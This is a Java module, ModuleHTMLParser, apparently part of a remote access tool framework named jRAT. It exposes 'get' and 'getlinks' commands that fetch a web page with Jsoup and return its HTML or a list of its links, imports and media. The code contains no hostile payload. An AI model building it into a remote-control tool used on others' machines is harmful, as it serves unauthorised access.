package jRAT.modules;

import java.io.UnsupportedEncodingException;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;


public class ModuleHTMLParser {

    public static void init(Class stage) {}

    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] showModuleInfo() throws UnsupportedEncodingException
    {
        StringBuilder moduleInfo = new StringBuilder();
        moduleInfo.append("\n*** MODULE: HTMLParser ***\n\n");
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "get",      "url")); 
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "getlinks", "url")); 
        return moduleInfo.toString().getBytes("UTF-8");
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static boolean isBackgroundMethod(String methodName)
    {
        return false;
    }
    
    /* ---------------------------------------------------------------------------------------------------------- */
    
    public static byte[] get(String url) throws UnsupportedEncodingException
    {
        try
        {
            Document document = Jsoup.connect(url).get();
            if (document != null)
                return document.outerHtml().getBytes("UTF-8");
        }
        catch (Exception ex) {}
        return null;
    }
 
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] getlinks(String url) throws UnsupportedEncodingException
    {
        try
        {
            Document document = Jsoup.connect(url).get();
            if (document != null)
            {
                StringBuilder response = new StringBuilder();               
                Elements links         = document.select("a[href]");
                Elements media         = document.select("[src]");
                Elements imports       = document.select("link[href]");
                  
                response.append(String.format("\nImports: (%d)\n", imports.size()));
                for (Element link : imports)
                {
                    response.append(String.format(" * %s <%s> (%s)\n", link.tagName(),
                                                                       link.attr("abs:href"),
                                                                       link.attr("rel")));
                }

                response.append(String.format("\nLinks: (%d)\n", links.size()));
                for (Element link : links)
                {
                    response.append(String.format(" * a: <%s>  (%s)\n", link.attr("abs:href"), trim(link.text(), 35)));
                }
                  
                response.append(String.format("\nMedia: (%d)\n", media.size()));
                for (Element src : media)
                {
                    if (src.normalName().equals("img"))
                    {
                        response.append(String.format(" * %s: <%s> %sx%s (%s)\n", src.tagName(),
                                                                                  src.attr("abs:src"),
                                                                                  src.attr("width"),
                                                                                  src.attr("height"),
                                                                                  trim(src.attr("alt"), 20)));
                    }
                    else
                    {
                        response.append(String.format(" * %s: <%s>\n", src.tagName(), src.attr("abs:src")));
                          
                    }
                }
                return response.toString().getBytes("UTF-8");               
            }
        }
        catch (Exception ex) {}
        return null;
    }
 
    /* ---------------------------------------------------------------------------------------------------------- */
    
    private static String trim(String s, int width)
    {
        if (s.length() > width)
            return s.substring(0, width-1) + ".";
        else
            return s;
    }

    /* ---------------------------------------------------------------------------------------------------------- */

}
